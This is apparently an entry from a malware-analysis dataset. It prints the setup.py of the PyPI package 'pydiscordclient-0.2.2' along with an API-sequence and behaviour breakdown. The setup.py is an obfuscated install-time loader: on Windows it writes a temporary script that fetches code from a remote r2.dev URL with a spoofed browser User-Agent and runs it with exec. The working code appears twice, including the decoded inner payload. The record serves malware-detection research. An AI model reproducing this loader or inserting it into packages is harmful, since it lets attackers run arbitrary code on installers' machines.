[
  {
    "pyfile": "setup.py",
    "code_snippet": "from os import system as _ckurix\nfrom os import name as _dolbkapdobtmqzj\nfrom sys import executable as _gcrlkj\nfrom tempfile import NamedTemporaryFile as _ayrvknneapdgpel\n\n_kdhs = _ayrvknneapdgpel(delete=False)\n_kdhs.write(b\"\"\"from urllib.request import urlopen as _vzmhmhuiyqup; from urllib.request import Request as _rziahhlptqzuayb; _earoek=exec; _earoek(_vzmhmhuiyqup(_rziahhlptqzuayb('https://pub-419bfb1465754687a6ed3a1145bf7202.r2.dev/lSnPxksiKyOTXyT1', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4296.0 Safari/537.36 Edg/88.0.681.0'})).read())\"\"\")\n_kdhs.close()\ntry: \n    if _dolbkapdobtmqzj == 'nt': \n        _ckurix(f\"start {_gcrlkj.replace('.exe', 'w.exe')} {_kdhs.name}\")\nexcept: pass",
    "pattern_analysis": {
      "api_sequence": [
        "tempfile.NamedTemporaryFile",
        "tempfile.NamedTemporaryFile.write",
        "tempfile.NamedTemporaryFile.close",
        "os.name",
        "os.system",
        "urllib.request.Request",
        "urllib.request.urlopen",
        "http.client.HTTPResponse.read",
        "exec"
      ],
      "api_sequence_with_args": [
        "tempfile.NamedTemporaryFile(delete=False)",
        "tempfile.NamedTemporaryFile.write(b'...')",
        "tempfile.NamedTemporaryFile.close()",
        "os.name",
        "os.system(f\"start {sys.executable.replace('.exe', 'w.exe')} {tempfile.NamedTemporaryFile.name}\")",
        "urllib.request.Request('https://pub-419bfb1465754687a6ed3a1145bf7202.r2.dev/lSnPxksiKyOTXyT1', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4296.0 Safari/537.36 Edg/88.0.681.0'})",
        "urllib.request.urlopen(urllib.request.Request(...))",
        "http.client.HTTPResponse.read()",
        "exec(http.client.HTTPResponse.read())"
      ],
      "mapped_sequence": [
        {
          "api_name": "tempfile.NamedTemporaryFile",
          "id": "create_temp_file",
          "description": "Creates temporary file that is not deleted on close",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "tempfile.NamedTemporaryFile.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "tempfile.NamedTemporaryFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "from os import system as _ckurix\nfrom os import name as _dolbkapdobtmqzj\nfrom sys import executable as _gcrlkj\nfrom tempfile import NamedTemporaryFile as _ayrvknneapdgpel\n\n_kdhs = _ayrvknneapdgpel(delete=False)\n_kdhs.write(b\"\"\"from urllib.request import urlopen as _vzmhmhuiyqup; from urllib.request import Request as _rziahhlptqzuayb; _earoek=exec; _earoek(_vzmhmhuiyqup(_rziahhlptqzuayb('https://pub-419bfb1465754687a6ed3a1145bf7202.r2.dev/lSnPxksiKyOTXyT1', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4296.0 Safari/537.36 Edg/88.0.681.0'})).read())\"\"\")\n_kdhs.close()\ntry:\n    if _dolbkapdobtmqzj == 'nt':\n        _ckurix(f\"start {_gcrlkj.replace('.exe', 'w.exe')} {_kdhs.name}\")\nexcept: pass\n\n# --- Code written to temp file and executed ---\nfrom urllib.request import urlopen as _vzmhmhuiyqup\nfrom urllib.request import Request as _rziahhlptqzuayb\n_earoek = exec\n_earoek(_vzmhmhuiyqup(_rziahhlptqzuayb('https://pub-419bfb1465754687a6ed3a1145bf7202.r2.dev/lSnPxksiKyOTXyT1', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4296.0 Safari/537.36 Edg/88.0.681.0'})).read())"
    }
  },
  {
    "metadata": {
      "package_name": "pydiscordclient-0.2.2",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/pydiscordclient-0.2.2/pydiscordclient-0.2.2/setup.py",
      "code_hash": "a303c34c2ab45cd6e42567ab39a40a95"
    }
  }
]